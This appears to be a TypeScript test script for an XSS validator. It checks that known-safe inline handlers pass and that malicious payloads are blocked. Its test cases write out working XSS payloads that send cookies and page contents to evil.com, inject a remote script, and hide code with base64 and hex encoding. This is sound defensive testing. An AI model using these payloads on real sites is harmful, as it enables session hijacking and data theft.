#!/usr/bin/env tsx
/**
 * Test XSS Validation System
 *
 * Tests baseline-aware validator with:
 * 1. Legitimate patterns from original HTML (should PASS)
 * 2. Malicious XSS payloads (should BLOCK)
 * 3. Edge cases
 */

import { BaselineAwareValidator } from '../lib/static-pages/xss-validator';
import { loadBaseline } from '../lib/static-pages/baseline-catalog';
import * as path from 'path';

interface TestCase {
  name: string;
  html: string;
  expectedValid: boolean;
  description: string;
}

async function main() {
  console.log('╔═══════════════════════════════════════════════════╗');
  console.log('║   XSS Validation System Test                      ║');
  console.log('╚═══════════════════════════════════════════════════╝\n');

  // Load baseline
  const baselinePath = path.join(
    process.cwd(),
    'lib/static-pages/baseline-patterns.json'
  );

  const baseline = await loadBaseline(baselinePath);
  const validator = new BaselineAwareValidator(baseline);

  console.log(`📊 Baseline loaded: ${baseline.patterns.length} patterns\n`);

  // Test cases
  const testCases: TestCase[] = [
    // ===== LEGITIMATE PATTERNS (should PASS) =====
    {
      name: '✅ Legitimate onclick from baseline',
      html: `<button onclick="openKakaoChat()">Contact</button>`,
      expectedValid: true,
      description: 'Known safe pattern from original HTML',
    },
    {
      name: '✅ Legitimate oninput from baseline',
      html: `<input type="tel" oninput="korean_ck(this)" maxlength="13" placeholder="010-0000-0000">`,
      expectedValid: true,
      description: 'Known safe input validation',
    },
    {
      name: '✅ Legitimate javascript: URL from baseline',
      html: `<a href="javascript:openKakaoChat()">Chat</a>`,
      expectedValid: true,
      description: 'Known safe javascript: URL',
    },
    {
      name: '✅ Legitimate inline script from baseline',
      html: `
        <script>
          function openKakaoChat() {
            window.open('https://pf.kakao.com/_xlIxlsK', '_blank');
          }
        </script>
      `,
      expectedValid: true,
      description: 'Known safe inline script',
    },

    // ===== MALICIOUS XSS PAYLOADS (should BLOCK) =====
    {
      name: '❌ XSS: document.cookie theft',
      html: `<button onclick="fetch('https://evil.com?c='+document.cookie)">Click</button>`,
      expectedValid: false,
      description: 'Cookie stealing attempt',
    },
    {
      name: '❌ XSS: eval() injection',
      html: `<button onclick="eval(atob('YWxlcnQoMSk='))">Click</button>`,
      expectedValid: false,
      description: 'Base64 encoded eval payload',
    },
    {
      name: '❌ XSS: XHR data exfiltration',
      html: `<img src=x onerror="new XMLHttpRequest().open('GET','https://evil.com?d='+btoa(document.body.innerHTML))">`,
      expectedValid: false,
      description: 'Data exfiltration via XHR',
    },
    {
      name: '❌ XSS: innerHTML injection',
      html: `<div onclick="this.innerHTML='<script>alert(1)</script>'">Click</div>`,
      expectedValid: false,
      description: 'DOM-based XSS via innerHTML',
    },
    {
      name: '❌ XSS: New malicious inline script',
      html: `
        <script>
          document.body.appendChild(document.createElement('script')).src='https://evil.com/xss.js';
        </script>
      `,
      expectedValid: false,
      description: 'External script injection',
    },
    {
      name: '❌ XSS: New malicious javascript: URL',
      html: `<a href="javascript:alert(document.cookie)">Click</a>`,
      expectedValid: false,
      description: 'New javascript: URL with alert',
    },
    {
      name: '❌ XSS: Obfuscated payload',
      html: `<button onclick="\\x77\\x69\\x6e\\x64\\x6f\\x77\\x2e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x63\\x6f\\x6d\\x27">Click</button>`,
      expectedValid: false,
      description: 'Hex-encoded redirect',
    },
    {
      name: '❌ XSS: fetch() data exfiltration',
      html: `<img src=x onerror="fetch('https://evil.com',{method:'POST',body:document.cookie})">`,
      expectedValid: false,
      description: 'Fetch API data theft',
    },

    // ===== EDGE CASES =====
    {
      name: '⚠️  Similar to baseline but NEW context',
      html: `<button onclick="window.open('https://DIFFERENT-DOMAIN.com')">Click</button>`,
      expectedValid: false, // CORRECT: Different URL = New pattern = Should block
      description: 'Similar pattern with different parameter (should block for security)',
    },
    {
      name: '✅ Empty HTML',
      html: '',
      expectedValid: true,
      description: 'Empty content should pass',
    },
    {
      name: '✅ Plain text content',
      html: '<p>Just plain text with no JavaScript</p>',
      expectedValid: true,
      description: 'No JavaScript patterns',
    },
  ];

  // Run tests
  let passed = 0;
  let failed = 0;
  const failures: string[] = [];

  for (const test of testCases) {
    const result = await validator.validate(test.html, 'test-file.html');
    const success = result.valid === test.expectedValid;

    if (success) {
      passed++;
      console.log(`${test.name} PASS`);
      console.log(`   ${test.description}`);
    } else {
      failed++;
      failures.push(test.name);
      console.log(`${test.name} FAIL`);
      console.log(`   Expected: ${test.expectedValid ? 'PASS' : 'BLOCK'}`);
      console.log(`   Got: ${result.valid ? 'PASS' : 'BLOCK'}`);
      console.log(`   Reason: ${result.error || 'N/A'}`);
      console.log(`   Risk: ${result.risk || 'N/A'}`);
      if (result.detectedPatterns && result.detectedPatterns.length > 0) {
        console.log(`   Patterns detected: ${result.detectedPatterns.length}`);
        result.detectedPatterns.slice(0, 2).forEach((p) => {
          console.log(`     - [${p.type}] Risk: ${p.riskScore}/10, New: ${p.isNew}`);
          console.log(`       ${p.pattern.substring(0, 80)}...`);
        });
      }
    }
    console.log();
  }

  // Summary
  console.log('╔═══════════════════════════════════════════════════╗');
  console.log('║   Test Results                                     ║');
  console.log('╚═══════════════════════════════════════════════════╝');
  console.log(`✅ Passed: ${passed}/${testCases.length}`);
  console.log(`❌ Failed: ${failed}/${testCases.length}`);

  if (failures.length > 0) {
    console.log('\n❌ Failed tests:');
    failures.forEach((f) => console.log(`   - ${f}`));
  }

  // Metrics
  const metrics = validator.getMetrics();
  console.log('\n📊 Validation Metrics:');
  console.log(`   Total validations: ${metrics.totalValidations}`);
  console.log(`   Blocked: ${metrics.blocked}`);
  console.log(`   Allowed: ${metrics.allowed}`);
  console.log(`   Cache hits: ${metrics.cacheHits}`);
  console.log(`   Cache hit rate: ${((metrics.cacheHits / metrics.totalValidations) * 100).toFixed(1)}%`);
  console.log(`   Average validation time: ${metrics.averageValidationTimeMs.toFixed(2)}ms`);

  // Exit code
  process.exit(failed > 0 ? 1 : 0);
}

main().catch((error) => {
  console.error('❌ Test failed:', error);
  process.exit(1);
});
